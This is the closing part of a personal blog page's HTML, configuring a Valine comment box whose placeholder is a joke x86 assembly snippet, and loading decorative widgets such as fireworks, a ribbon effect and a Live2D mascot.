      placeholder: 'xor ebx,ebx;push 0xdeadbeef;mov ecx,[esp];mov edx,0x400;mov al,0x03;int 0x80',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '//i0.hdslb.com/bfs/emote/',
      emojiMaps: {"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_親親":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_偷笑":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_再見":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_冷漠":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_發怒":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_發財":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_可愛":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_吐血":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_呆":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_嘔吐":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_困":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_壞笑":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_大佬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_大哭":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_委屈":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_害羞":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_尷尬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_微笑":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_思考":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_驚嚇":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png"},
      enableQQ: false,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick,mail'.split(','))
    }
    
    if (false) {
      const otherData = false
      initData = Object.assign({}, initData, otherData)
    }
    
    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.querySelector('#vcomment'),loadValine)
  else setTimeout(() => loadValine(), 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>